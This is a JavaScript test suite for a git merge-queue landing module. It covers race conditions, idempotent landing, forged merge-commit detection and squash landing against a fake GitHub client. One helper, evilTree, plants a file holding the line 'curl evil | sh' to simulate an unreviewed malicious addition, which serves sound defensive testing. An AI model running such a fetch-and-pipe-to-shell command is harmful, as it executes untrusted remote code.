// omni-queue WP2: landing (scripts/merge-queue/land.mjs). merge-ff runs against real git
// repositories in os.tmpdir(); squash-api runs against an in-memory fake GitHub client.
import assert from "node:assert/strict";
import test from "node:test";

import { candidateRef } from "../../../../scripts/merge-queue/contracts.mjs";
import {
  composeCandidate,
  fetchInputs,
  mergeTree,
  prepareRepo,
  pushCandidate,
} from "../../../../scripts/merge-queue/compose.mjs";
import {
  landMergeFf,
  landSquashApi,
  verifyComposition,
} from "../../../../scripts/merge-queue/land.mjs";
import { createSandbox, prRef } from "./helpers/git-sandbox.mjs";

const BASE = "release/v1.0.0";

function setup(t, gitOptions = {}) {
  const sb = createSandbox({ base: BASE });
  t.after(() => sb.cleanup());
  const scratch = sb.newDir("scratch");
  const git = sb.scratchGit(scratch, gitOptions);
  prepareRepo({ git, remoteUrl: sb.remoteUrl, filter: null });
  return { sb, git, scratch };
}

/** Compose a green batch of `count` independent PRs and push its candidate ref. */
function composeBatch(sb, git, numbers) {
  const prs = numbers.map((n) => prRef(n, sb.publishPr(n, { [`pr-${n}.txt`]: `${n}\n` })));
  const { baseSha, heads } = fetchInputs({ git, base: BASE, prs });
  const res = composeCandidate({ git, base: BASE, baseSha, prs, batchId: "b1", heads });
  assert.equal(res.included.length, numbers.length);
  const ref = candidateRef(BASE, "b1", res.candidateSha);
  pushCandidate({ git, sha: res.candidateSha, ref });
  return { prs, res, ref };
}

const originOut = (sb, args) => sb.origin(args).stdout;
const isAncestorInOrigin = (sb, a, b) =>
  sb.origin(["merge-base", "--is-ancestor", a, b], { allowFail: true }).code === 0;

test("merge-ff lands the exact candidate: base == candidate, heads reachable, same tree", (t) => {
  const { sb, git } = setup(t);
  const { prs, res } = composeBatch(sb, git, [1, 2, 3]);

  const out = landMergeFf({
    git,
    base: BASE,
    candidateSha: res.candidateSha,
    expectedBaseSha: res.baseSha,
  });
  assert.deepEqual(out, { ok: true, newBaseSha: res.candidateSha, merged: [1, 2, 3] });
  assert.equal(sb.baseSha(), res.candidateSha);
  for (const pr of prs) {
    assert.equal(isAncestorInOrigin(sb, pr.head, sb.baseSha()), true, `#${pr.n} reachable`);
  }
  assert.equal(
    originOut(sb, ["rev-parse", `refs/heads/${BASE}^{tree}`]),
    originOut(sb, ["rev-parse", `${res.candidateSha}^{tree}`])
  );
  assert.equal(originOut(sb, ["rev-parse", `${res.candidateSha}^{tree}`]), res.treeSha);
});

test("merge-ff from a fresh scratch repository fetches the candidate by SHA", (t) => {
  const { sb, git } = setup(t);
  const { res } = composeBatch(sb, git, [4, 5]);
  const freshDir = sb.newDir("fresh-runner");
  const fresh = sb.scratchGit(freshDir);
  prepareRepo({ git: fresh, remoteUrl: sb.remoteUrl, filter: null });

  const out = landMergeFf({
    git: fresh,
    base: BASE,
    candidateSha: res.candidateSha,
    expectedBaseSha: res.baseSha,
  });
  assert.equal(out.ok, true);
  assert.deepEqual(out.merged, [4, 5]);
  assert.equal(sb.baseSha(), res.candidateSha);
});

/**
 * Git runner that runs `beforePush()` right before the first `git push` (simulates the base moving
 * between the pre-push read of the base and the push itself) and records every push.
 */
function racingGit(git, beforePush) {
  let fired = false;
  const pushes = [];
  const hook = (args) => {
    if (args[0] !== "push") return;
    pushes.push(args);
    if (!fired) {
      fired = true;
      beforePush();
    }
  };
  return {
    cwd: git.cwd,
    pushes,
    run: (args, opts) => (hook(args), git.run(args, opts)),
    out: (args, opts) => (hook(args), git.out(args, opts)),
  };
}

test("base moved during CI: refused before pushing → base-moved, base untouched", (t) => {
  const { sb, git } = setup(t);
  const { res } = composeBatch(sb, git, [6, 7]);
  const manual = sb.advanceBase({ "manual.txt": "merged by hand\n" });

  const spy = racingGit(git, () => {});
  const out = landMergeFf({
    git: spy,
    base: BASE,
    candidateSha: res.candidateSha,
    expectedBaseSha: res.baseSha,
  });
  assert.equal(out.ok, false);
  assert.equal(out.reason, "base-moved");
  assert.deepEqual(out.merged, []);
  assert.equal(out.newBaseSha, manual);
  assert.deepEqual(spy.pushes, [], "nothing pushed");
  assert.equal(sb.baseSha(), manual, "the manual merge survives");

  // Same verdict once the scratch store knows the moved tip.
  fetchInputs({ git, base: BASE, prs: [] });
  const again = landMergeFf({
    git: spy,
    base: BASE,
    candidateSha: res.candidateSha,
    expectedBaseSha: res.baseSha,
  });
  assert.equal(again.reason, "base-moved");
  assert.equal(again.newBaseSha, manual);
  assert.deepEqual(spy.pushes, []);
  assert.equal(sb.baseSha(), manual);
});

test("base moves between the read and the push: the lease refusal is the CAS", (t) => {
  // The push leases the tip it read, so whether or not the moved tip is known locally the
  // refusal is the lease's "stale info" (before the lease: "fetch first" / "non-fast-forward").
  for (const [label, knownLocally, summary] of [
    ["unknown tip", false, /stale info/],
    ["known tip", true, /stale info/],
  ]) {
    const { sb, git } = setup(t);
    const { res } = composeBatch(sb, git, [6, 7]);
    let manual = null;
    const racing = racingGit(git, () => {
      manual = sb.advanceBase({ "manual.txt": `race ${label}\n` });
      if (knownLocally) fetchInputs({ git, base: BASE, prs: [] });
    });
    const out = landMergeFf({
      git: racing,
      base: BASE,
      candidateSha: res.candidateSha,
      expectedBaseSha: res.baseSha,
    });
    assert.equal(racing.pushes.length, 1, label);
    assert.equal(out.ok, false, label);
    assert.equal(out.reason, "base-moved", label);
    assert.match(out.detail, summary, label);
    assert.equal(out.newBaseSha, manual, label);
    assert.equal(sb.baseSha(), manual, `${label}: the racing commit survives`);
  }
});

test("base rewound by an admin (force-push to an older commit) → base-moved, nothing restored", (t) => {
  const { sb, git } = setup(t);
  const older = sb.baseSha();
  const bad = sb.advanceBase({ "bad.txt": "removed later\n" });
  const { res } = composeBatch(sb, git, [11, 12]);
  assert.equal(res.baseSha, bad);
  sb.work(["push", "--quiet", "--force", "origin", `${older}:refs/heads/${BASE}`]);

  const out = landMergeFf({
    git,
    base: BASE,
    candidateSha: res.candidateSha,
    expectedBaseSha: res.baseSha,
  });
  assert.equal(out.ok, false);
  assert.equal(out.reason, "base-moved");
  assert.deepEqual(out.merged, []);
  assert.equal(out.newBaseSha, older);
  assert.equal(sb.baseSha(), older, "the rewound base is kept");
  const files = originOut(sb, ["ls-tree", "--name-only", `refs/heads/${BASE}`]).split("\n");
  assert.equal(files.includes("bad.txt"), false, "the removed commit is not brought back");
});

test("base rewound between the read and the push → base-moved, nothing restored", (t) => {
  const { sb, git } = setup(t);
  const older = sb.baseSha();
  const bad = sb.advanceBase({ "bad.txt": "removed later\n" });
  const { res } = composeBatch(sb, git, [17, 18]);
  assert.equal(res.baseSha, bad);
  const racing = racingGit(git, () =>
    sb.work(["push", "--quiet", "--force", "origin", `${older}:refs/heads/${BASE}`])
  );

  const out = landMergeFf({
    git: racing,
    base: BASE,
    candidateSha: res.candidateSha,
    expectedBaseSha: res.baseSha,
  });
  assert.equal(racing.pushes.length, 1, "the push ran after the rewind");
  assert.equal(out.ok, false);
  assert.equal(out.reason, "base-moved");
  assert.match(out.detail, /stale info/);
  assert.deepEqual(out.merged, []);
  assert.equal(out.newBaseSha, older);
  assert.equal(sb.baseSha(), older, "the rewound base is kept");
  const files = originOut(sb, ["ls-tree", "--name-only", `refs/heads/${BASE}`]).split("\n");
  assert.equal(files.includes("bad.txt"), false, "the removed commit is not brought back");
});

test("base deleted between the read and the push → base-moved, branch not recreated", (t) => {
  const { sb, git } = setup(t);
  const { res } = composeBatch(sb, git, [19]);
  const racing = racingGit(git, () => sb.origin(["update-ref", "-d", `refs/heads/${BASE}`]));

  const out = landMergeFf({
    git: racing,
    base: BASE,
    candidateSha: res.candidateSha,
    expectedBaseSha: res.baseSha,
  });
  assert.equal(racing.pushes.length, 1, "the push ran after the deletion");
  assert.equal(out.ok, false);
  assert.equal(out.reason, "base-moved");
  assert.match(out.detail, /stale info/);
  assert.deepEqual(out.merged, []);
  assert.equal(out.newBaseSha, undefined);
  assert.equal(sb.baseSha(), null, "the deleted base is not recreated");
});

test("re-landing an already landed candidate is idempotent (crash before the state save)", (t) => {
  const { sb, git } = setup(t);
  const { res } = composeBatch(sb, git, [13, 14]);
  const input = { git, base: BASE, candidateSha: res.candidateSha, expectedBaseSha: res.baseSha };
  const first = landMergeFf(input);
  assert.deepEqual(first, { ok: true, newBaseSha: res.candidateSha, merged: [13, 14] });

  const spy = racingGit(git, () => {});
  const second = landMergeFf({ ...input, git: spy });
  assert.equal(second.ok, true);
  assert.equal(second.newBaseSha, res.candidateSha);
  assert.deepEqual(second.merged, [13, 14]);
  assert.deepEqual(spy.pushes, [], "no second push");
  assert.equal(sb.baseSha(), res.candidateSha, "base unchanged");
});

test("base fast-forwarded to a commit inside the candidate still lands the tested tree", (t) => {
  const { sb, git } = setup(t);
  const { prs, res } = composeBatch(sb, git, [15, 16]);
  // Someone fast-forwards the base to #15's head (a descendant of the expected base and an
  // ancestor of the candidate).
  sb.work(["push", "--quiet", "origin", `${prs[0].head}:refs/heads/${BASE}`]);
  const out = landMergeFf({
    git,
    base: BASE,
    candidateSha: res.candidateSha,
    expectedBaseSha: res.baseSha,
  });
  assert.deepEqual(out, { ok: true, newBaseSha: res.candidateSha, merged: [15, 16] });
  assert.equal(sb.baseSha(), res.candidateSha);
});

test("merged reports stacked PRs (alreadyContained) only when given the batch's PRs", (t) => {
  const { sb, git } = setup(t);
  const lower = sb.publishPr(20, { "lower.txt": "L\n" });
  const upper = sb.publishPr(21, { "upper.txt": "U\n" }, { from: lower });
  const other = sb.publishPr(22, { "other.txt": "O\n" });
  // In-base PR (its head is the base tip): never reported as landed by this candidate.
  const inBase = prRef(23, sb.baseSha());
  const prs = [prRef(21, upper), prRef(20, lower), prRef(22, other)];
  const { baseSha, heads } = fetchInputs({ git, base: BASE, prs });
  const res = composeCandidate({ git, base: BASE, baseSha, prs, batchId: "b1", heads });
  assert.deepEqual(
    res.alreadyContained.map((p) => p.n),
    [20]
  );
  pushCandidate({ git, sha: res.candidateSha, ref: candidateRef(BASE, "b1", res.candidateSha) });

  // Unknown head (never fetched) is skipped without error.
  const unknown = prRef(24, "f".repeat(40));
  const out = landMergeFf({
    git,
    base: BASE,
    candidateSha: res.candidateSha,
    expectedBaseSha: res.baseSha,
    prs: [...prs, inBase, unknown],
  });
  assert.equal(out.ok, true);
  assert.deepEqual(out.merged, [21, 22, 20]);

  // Without `prs`, only the PRs with a queue merge commit are reported.
  const replay = landMergeFf({
    git,
    base: BASE,
    candidateSha: res.candidateSha,
    expectedBaseSha: res.baseSha,
  });
  assert.deepEqual(replay.merged, [21, 22]);
});

// ───────────────────────── verifyComposition (the stored batch IS its candidate) ─────────────────────────

/** verifyComposition with the inputs of the tick (the stored in-flight record). */
const verify = (git, res, prs, extra = {}) =>
  verifyComposition({
    git,
    expectedBaseSha: res.baseSha,
    candidateSha: res.candidateSha,
    prs,
    ...extra,
  });

test("verifyComposition accepts a composed batch, and its tree when one is given", (t) => {
  const { sb, git } = setup(t);
  const { prs, res } = composeBatch(sb, git, [1, 2, 3]);
  assert.deepEqual(verify(git, res, prs), { ok: true });
  assert.deepEqual(verify(git, res, prs, { treeSha: res.treeSha }), { ok: true });
  const other = verify(git, res, prs, { treeSha: "e".repeat(40) });
  assert.equal(other.ok, false);
  assert.match(other.detail, /tree/);
});

test("verifyComposition accepts exactly what composeCandidate builds for a stacked PR", (t) => {
  const { sb, git } = setup(t);
  const lower = sb.publishPr(20, { "lower.txt": "L\n" });
  const upper = sb.publishPr(21, { "upper.txt": "U\n" }, { from: lower });
  const other = sb.publishPr(22, { "other.txt": "O\n" });
  const prs = [prRef(21, upper), prRef(20, lower), prRef(22, other)];
  const { baseSha, heads } = fetchInputs({ git, base: BASE, prs });
  const res = composeCandidate({ git, base: BASE, baseSha, prs, batchId: "b1", heads });
  assert.deepEqual(
    res.alreadyContained.map((p) => p.n),
    [20],
    "#20 rides along without a merge commit"
  );
  assert.deepEqual(verify(git, res, res.included), { ok: true });
  // The same stacked PR named BEFORE the PR that contains it: composeCandidate would have merged
  // it on its own, so a candidate without its merge commit is not that batch.
  const reordered = verify(git, res, [prRef(20, lower), prRef(21, upper), prRef(22, other)]);
  assert.equal(reordered.ok, false);
  assert.match(reordered.detail, /#20/);
});

test("verifyComposition refuses a batch with no pull request", (t) => {
  const { sb, git } = setup(t);
  const { res } = composeBatch(sb, git, [1]);
  for (const prs of [[], undefined, null]) {
    const out = verify(git, res, prs);
    assert.equal(out.ok, false, JSON.stringify(prs));
    assert.match(out.detail, /no pull request/);
  }
});

test("verifyComposition refuses a candidate with one extra first-parent commit", (t) => {
  const { sb, git } = setup(t);
  const { prs, res } = composeBatch(sb, git, [1, 2]);
  // Same tree as the candidate, one more commit on top: the planted commit of a state edit.
  const extra = git.out(["commit-tree", `${res.candidateSha}^{tree}`, "-p", res.candidateSha], {
    input: "planted\n",
  });
  const out = verify(git, { ...res, candidateSha: extra }, prs);
  assert.equal(out.ok, false);
  assert.match(out.detail, /not a queue merge commit/);
  // A forged "merge" naming PR #2 whose second parent is not #2's head is refused the same way.
  const forged = git.out(
    ["commit-tree", `${res.candidateSha}^{tree}`, "-p", res.candidateSha, "-p", res.baseSha],
    { input: `Merge PR #2: x\n\nOmni-Queue-PR: 2\nOmni-Queue-Head: ${prs[1].head}\n` }
  );
  const forgedOut = verify(git, { ...res, candidateSha: forged }, prs);
  assert.equal(forgedOut.ok, false);
  assert.match(forgedOut.detail, /not a queue merge commit/);
});

test("verifyComposition refuses a candidate whose merge commits name a different PR set", (t) => {
  const { sb, git } = setup(t);
  const { prs, res } = composeBatch(sb, git, [1, 2, 3]);
  const cases = [
    ["a PR fewer than the candidate merges", prs.slice(0, 2), /merges #3/],
    [
      "a PR the candidate does not contain",
      [...prs, prRef(4, sb.publishPr(4, { x: "x\n" }))],
      /#4/,
    ],
    ["another PR in place of one", [prs[0], prRef(9, prs[1].head), prs[2]], /#9|#2/],
    ["another head for a PR", [prs[0], prRef(2, prs[2].head), prs[2]], /head/],
    ["the PRs in another order", [prs[1], prs[0], prs[2]], /#|head/],
    ["a PR twice", [prs[0], prs[0], prs[1], prs[2]], /twice/],
  ];
  for (const [label, stored, detail] of cases) {
    const out = verify(git, res, stored);
    assert.equal(out.ok, false, label);
    assert.match(out.detail, detail, label);
  }
});

test("verifyComposition refuses a candidate whose Omni-Queue-Base trailer is not the expected base", (t) => {
  const { sb, git } = setup(t);
  const { prs, res } = composeBatch(sb, git, [1]);
  const short = (sha) => sha.slice(0, 12);
  const tree = git.out(["rev-parse", `${res.candidateSha}^{tree}`]);
  const plant = (trailerLines) =>
    git.out(["commit-tree", tree, "-p", res.baseSha, "-p", prs[0].head, "-F", "-"], {
      input: `Merge PR #1: x (@a)\n\nOmni-Queue-PR: 1\nOmni-Queue-Head: ${prs[0].head}\n${trailerLines}`,
    });

  // The probe: honest tree and parents, but the base trailer names the PR head. The candidate's
  // CI takes its base from that trailer and would compare <PR head>..<candidate>: nothing.
  const lying = plant(`Omni-Queue-Base: ${prs[0].head}\n`);
  for (const trees of [false, true]) {
    const out = verify(git, { ...res, candidateSha: lying }, prs, { trees });
    assert.equal(out.ok, false, `trees: ${trees}`);
    assert.equal(
      out.detail,
      `merge commit ${short(lying)} of #1 carries Omni-Queue-Base ${short(prs[0].head)}, ` +
        `the batch's base is ${short(res.baseSha)}`
    );
  }

  // No base trailer at all is a mismatch too.
  const bare = plant("");
  const none = verify(git, { ...res, candidateSha: bare }, prs, { trees: true });
  assert.equal(none.ok, false);
  assert.equal(none.detail, `merge commit ${short(bare)} of #1 carries no Omni-Queue-Base trailer`);

  // The honest candidate still passes, with and without trees.
  assert.deepEqual(verify(git, res, prs), { ok: true });
  assert.deepEqual(verify(git, res, prs, { trees: true }), { ok: true });
});

test("verifyComposition checks the base trailer on every commit of a longer chain", (t) => {
  const { sb, git } = setup(t);
  const { prs, res } = composeBatch(sb, git, [1, 2]);
  const [m1, m2] = chainOf(git, res.baseSha, res.candidateSha);
  // The first merge commit re-written with a base trailer naming #1's head, the second rebuilt
  // honestly on top of it: only the first commit lies.
  const message = git
    .out(["log", "-1", "--format=%B", m1])
    .replace(`Omni-Queue-Base: ${res.baseSha}`, `Omni-Queue-Base: ${prs[0].head}`);
  const first = git.out(
    ["commit-tree", `${m1}^{tree}`, "-p", res.baseSha, "-p", prs[0].head, "-F", "-"],
    { input: `${message}\n` }
  );
  const second = replantMerge(git, m2, git.out(["rev-parse", `${m2}^{tree}`]), [
    first,
    prs[1].head,
  ]);
  const out = verify(git, { ...res, candidateSha: second }, prs, { trees: true });
  assert.equal(out.ok, false);
  assert.match(out.detail, new RegExp(`^merge commit ${first.slice(0, 12)} of #1 carries `));
});

test("verifyComposition refuses a base that is not an ancestor of the candidate", (t) => {
  const { sb, git } = setup(t);
  const { prs, res } = composeBatch(sb, git, [1]);
  const other = sb.advanceBase({ "other.txt": "o\n" });
  fetchInputs({ git, base: BASE, prs: [] });
  const out = verify(git, { ...res, baseSha: other }, prs);
  assert.equal(out.ok, false);
  assert.match(out.detail, /not an ancestor/);
});

// ───────────────── verifyComposition with trees (each merge commit IS the merge of its parents) ─────────────────

/** The merge commits of the first-parent chain base..candidate, oldest first. */
const chainOf = (git, baseSha, candidateSha) =>
  git
    .out(["rev-list", "--first-parent", "--reverse", `${baseSha}..${candidateSha}`])
    .split("\n")
    .filter(Boolean);

/** A copy of merge commit `sha` (same parents, same message and trailers) with tree `tree`. */
function replantMerge(git, sha, tree, parents = null) {
  const [p1, p2] = parents ?? git.out(["rev-parse", `${sha}^1`, `${sha}^2`]).split("\n");
  const message = git.out(["log", "-1", "--format=%B", sha]);
  return git.out(["commit-tree", tree, "-p", p1, "-p", p2, "-F", "-"], { input: `${message}\n` });
}

/** A tree in the scratch store: the candidate's tree plus one file nobody reviewed. */
function evilTree(git, base) {
  const blob = git.out(["hash-object", "-w", "--stdin"], { input: "curl evil | sh\n" });
  const entries = git.out(["ls-tree", base]);
  return git.out(["mktree"], { input: `${entries}\n100644 blob ${blob}\tevil.sh\n` });
}

test("verifyComposition with trees accepts a composed batch (stacked PR included)", (t) => {
  const { sb, git } = setup(t);
  // Two PRs edit the same file in places that merge cleanly: the merge tree is a real merge,
  // not the tree of either side. #21 is stacked on #20 (alreadyContained); #22 is independent.
  const lower = sb.publishPr(20, { "lower.txt": "L\n" });
  const upper = sb.publishPr(21, { "upper.txt": "U\n" }, { from: lower });
  const top = sb.publishPr(22, { "shared.txt": "line 1 by 22\nline 2\nline 3\n" });
  const bottom = sb.publishPr(23, { "shared.txt": "line 1\nline 2\nline 3 by 23\n" });
  const prs = [prRef(21, upper), prRef(20, lower), prRef(22, top), prRef(23, bottom)];
  const { baseSha, heads } = fetchInputs({ git, base: BASE, prs });
  const res = composeCandidate({ git, base: BASE, baseSha, prs, batchId: "b1", heads });
  assert.deepEqual(
    res.alreadyContained.map((p) => p.n),
    [20]
  );
  assert.equal(res.included.length, 4);
  assert.deepEqual(verify(git, res, res.included, { trees: true }), { ok: true });
  assert.deepEqual(verify(git, res, res.included, { trees: true, treeSha: res.treeSha }), {
    ok: true,
  });
  assert.equal(
    git.out(["show", `${res.candidateSha}:shared.txt`]),
    "line 1 by 22\nline 2\nline 3 by 23",
    "the candidate carries both edits"
  );

  // A fresh scratch repository (a later tick on another runner) fetches the candidate by SHA and
  // recomposes the same trees.
  const fresh = sb.scratchGit(sb.newDir("fresh"));
  prepareRepo({ git: fresh, remoteUrl: sb.remoteUrl, filter: null });
  pushCandidate({ git, sha: res.candidateSha, ref: candidateRef(BASE, "b1", res.candidateSha) });
  fresh.run(["fetch", "--no-tags", "--quiet", "origin", res.candidateSha]);
  assert.deepEqual(verify(fresh, res, res.included, { trees: true }), { ok: true });
});

test("a merge commit with the right parents and trailers but another tree is refused, detail names #n", (t) => {
  const { sb, git } = setup(t);
  const { prs, res } = composeBatch(sb, git, [1, 2, 3]);
  const [, m2, m3] = chainOf(git, res.baseSha, res.candidateSha);
  const short = (sha) => sha.slice(0, 12);

  // The last merge commit replanted with another tree: parents, message and trailers unchanged.
  const evil = evilTree(git, `${m3}^{tree}`);
  const planted = replantMerge(git, m3, evil);
  const forged = { ...res, candidateSha: planted };
  assert.deepEqual(verify(git, forged, prs), { ok: true }, "the shape alone cannot tell");
  const out = verify(git, forged, prs, { trees: true });
  assert.equal(out.ok, false);
  assert.equal(
    out.detail,
    `merge commit ${short(planted)} of #3: tree ${short(evil)}, recomposing gives ` +
      short(git.out(["rev-parse", `${m3}^{tree}`]))
  );

  // A planted tree in the middle of the chain, with the commits after it merged honestly on top.
  const middle = replantMerge(git, m2, evilTree(git, `${m2}^{tree}`));
  const honest = mergeTree(git, middle, prs[2].head);
  assert.equal(honest.clean, true);
  const rebuilt = replantMerge(git, m3, honest.tree, [middle, prs[2].head]);
  const deep = verify(git, { ...res, candidateSha: rebuilt }, prs, { trees: true });
  assert.equal(deep.ok, false);
  assert.match(deep.detail, new RegExp(`^merge commit ${short(middle)} of #2: tree `));
});

test("a merge commit whose parents do not merge cleanly is refused: recomposing gives conflict", (t) => {
  const { sb, git } = setup(t);
  const a = sb.publishPr(5, { "shared.txt": "line 1 by 5\nline 2\nline 3\n" });
  const b = sb.publishPr(6, { "shared.txt": "line 1 by 6\nline 2\nline 3\n" });
  const prs = [prRef(5, a), prRef(6, b)];
  const { baseSha, heads } = fetchInputs({ git, base: BASE, prs });
  const res = composeCandidate({ git, base: BASE, baseSha, prs, batchId: "b1", heads });
  assert.deepEqual(
    res.excludedBatchConflict.map((p) => p.n),
    [6],
    "the composer itself refuses #6 on top of #5"
  );
  // Planted: a merge commit of #6 on the candidate anyway, carrying #6's own tree.
  const message = `Merge PR #6: x\n\nOmni-Queue-PR: 6\nOmni-Queue-Head: ${b}\n`;
  const planted = git.out(
    ["commit-tree", `${b}^{tree}`, "-p", res.candidateSha, "-p", b, "-F", "-"],
    { input: message }
  );
  const out = verify(git, { ...res, candidateSha: planted }, prs, { trees: true });
  assert.equal(out.ok, false);
  assert.equal(
    out.detail,
    `merge commit ${planted.slice(0, 12)} of #6: tree ` +
      `${git.out(["rev-parse", `${b}^{tree}`]).slice(0, 12)}, recomposing gives conflict`
  );

  // A head without common history with the candidate: composeCandidate never merges one.
  const orphan = sb.publishUnrelatedPr(7, { "alien.txt": "a\n" });
  fetchInputs({ git, base: BASE, prs: [prRef(7, orphan)] });
  const alien = git.out(
    ["commit-tree", `${orphan}^{tree}`, "-p", res.candidateSha, "-p", orphan, "-F", "-"],
    { input: `Merge PR #7: x\n\nOmni-Queue-PR: 7\nOmni-Queue-Head: ${orphan}\n` }
  );
  const unrelated = verify(git, { ...res, candidateSha: alien }, [prs[0], prRef(7, orphan)], {
    trees: true,
  });
  assert.equal(unrelated.ok, false);
  assert.match(
    unrelated.detail,
    /^merge commit [0-9a-f]{12} of #7: tree [0-9a-f]{12}, recomposing gives conflict$/
  );
});

test("not-descendant: expected base is not an ancestor of the candidate → nothing pushed", (t) => {
  const { sb, git } = setup(t);
  const { res } = composeBatch(sb, git, [8]);
  // Another commit on the base that the candidate does not contain, used as the expected base.
  const other = sb.advanceBase({ "other.txt": "o\n" });
  const out = landMergeFf({
    git,
    base: BASE,
    candidateSha: res.candidateSha,
    expectedBaseSha: other,
  });
  assert.equal(out.ok, false);
  assert.equal(out.reason, "not-descendant");
  assert.equal(sb.baseSha(), other);
});

test("a protected-branch refusal is 'rejected' with a redacted detail", (t) => {
  const token = "ghs_fakeSecretToken123";
  const { sb, git } = setup(t, { token });
  const { res } = composeBatch(sb, git, [9]);
  sb.installOriginHook(
    "pre-receive",
    `#!/bin/sh\necho "protected branch hook declined (token ${token})" >&2\nexit 1\n`
  );
  const before = sb.baseSha();
  const out = landMergeFf({
    git,
    base: BASE,
    candidateSha: res.candidateSha,
    expectedBaseSha: res.baseSha,
  });
  assert.equal(out.ok, false);
  assert.equal(out.reason, "rejected");
  assert.match(out.detail, /declined/);
  assert.equal(out.detail.includes(token), false, "token must be redacted");
  assert.equal(sb.baseSha(), before);
});

test("a missing base branch is rejected instead of being created", (t) => {
  const { sb, git } = setup(t);
  const { res } = composeBatch(sb, git, [10]);
  sb.origin(["update-ref", "-d", `refs/heads/${BASE}`]);
  const out = landMergeFf({
    git,
    base: BASE,
    candidateSha: res.candidateSha,
    expectedBaseSha: res.baseSha,
  });
  assert.equal(out.ok, false);
  assert.equal(out.reason, "rejected");
  assert.equal(sb.baseSha(), null);
});

test("landMergeFf refuses candidate/state refs and invalid SHAs as the base", (t) => {
  const { git } = setup(t);
  const sha = "a".repeat(40);
  for (const base of ["omni-queue/release-v1.0.0/b1-aaaaaaaaaaaa", "omni-queue-state", "x:y"]) {
    assert.throws(
      () => landMergeFf({ git, base, candidateSha: sha, expectedBaseSha: sha }),
      /unsafe base/
    );
  }
  assert.throws(
    () => landMergeFf({ git, base: BASE, candidateSha: "nope", expectedBaseSha: sha }),
    /invalid candidateSha/
  );
});

// ───────────────────────── squash-api with a fake GitHub ─────────────────────────

const sha = (c) => c.repeat(40);
const TREE_OK = sha("7");

/**
 * In-memory GitHub: base tip + commits. Each successful squash creates a new tip whose tree
 * comes from `treeAfter[n]`; `fail` maps PR number → {status, message} or "throw".
 */
function fakeGh({ tip = sha("1"), treeAfter = {}, fail = {} } = {}) {
  const state = { tip, commits: new Map([[tip, { treeSha: sha("0") }]]), calls: [] };
  let seq = 0;
  return {
    state,
    async getBranchSha(branch) {
      assert.equal(branch, BASE);
      return state.tip;
    },
    async getCommit(id) {
      const c = state.commits.get(id);
      if (!c) throw new Error(`unknown commit ${id}`);
      return { sha: id, treeSha: c.treeSha, parents: [], message: "" };
    },
    async mergePull(n, opts) {
      state.calls.push({ n, ...opts });
      if (fail[n] === "throw") throw new Error("network down");
      if (fail[n]) return { merged: false, sha: null, ...fail[n] };
      seq += 1;
      const id = String(seq).padStart(40, "c");
      state.commits.set(id, { treeSha: treeAfter[n] ?? sha("9") });
      state.tip = id;
      return { merged: true, sha: id, status: 200, message: "Pull Request successfully merged" };
    },
  };
}

const PRS = [prRef(1, sha("a")), prRef(2, sha("b")), prRef(3, sha("d"))];

test("squash-api: every PR squashed at its approved head, final tree == candidate tree", async () => {
  const gh = fakeGh({ treeAfter: { 3: TREE_OK } });
  const out = await landSquashApi({
    gh,
    base: BASE,
    prs: PRS,
    expectedBaseSha: sha("1"),
    candidateTreeSha: TREE_OK,
  });
  assert.deepEqual(out, { ok: true, merged: [1, 2, 3], newBaseSha: gh.state.tip });
  assert.deepEqual(
    gh.state.calls,
    PRS.map((p) => ({ n: p.n, method: "squash", sha: p.head }))
  );
});

test("squash-api: a failure mid-sequence stops and reports the partial merge", async () => {
  const gh = fakeGh({ fail: { 2: { status: 409, message: "Head branch was modified" } } });
  const out = await landSquashApi({
    gh,
    base: BASE,
    prs: PRS,
    expectedBaseSha: sha("1"),
    candidateTreeSha: TREE_OK,
  });
  assert.equal(out.ok, false);
  assert.equal(out.reason, "merge-failed");
  assert.deepEqual(out.merged, [1]);
  assert.match(out.detail, /#2: 409 Head branch was modified/);
  assert.deepEqual(
    gh.state.calls.map((c) => c.n),
    [1, 2],
    "#3 is never attempted"
  );

  const thrown = fakeGh({ fail: { 1: "throw" } });
  const out2 = await landSquashApi({
    gh: thrown,
    base: BASE,
    prs: PRS,
    expectedBaseSha: sha("1"),
    candidateTreeSha: TREE_OK,
  });
  assert.equal(out2.reason, "merge-failed");
  assert.deepEqual(out2.merged, []);
  assert.match(out2.detail, /network down/);
});

test("squash-api: final tree different from the tested candidate → tree-divergence", async () => {
  const gh = fakeGh({ treeAfter: { 3: sha("8") } });
  const out = await landSquashApi({
    gh,
    base: BASE,
    prs: PRS,
    expectedBaseSha: sha("1"),
    candidateTreeSha: TREE_OK,
  });
  assert.equal(out.ok, false);
  assert.equal(out.reason, "tree-divergence");
  assert.deepEqual(out.merged, [1, 2, 3]);
  assert.equal(out.actualTree, sha("8"));
  assert.equal(out.newBaseSha, gh.state.tip);
});

test("squash-api: base moved before starting → base-moved, nothing merged", async () => {
  const gh = fakeGh({ tip: sha("2") });
  const out = await landSquashApi({
    gh,
    base: BASE,
    prs: PRS,
    expectedBaseSha: sha("1"),
    candidateTreeSha: TREE_OK,
  });
  assert.equal(out.ok, false);
  assert.equal(out.reason, "base-moved");
  assert.deepEqual(out.merged, []);
  assert.equal(out.newBaseSha, sha("2"));
  assert.deepEqual(gh.state.calls, [], "mergePull is never called");
});
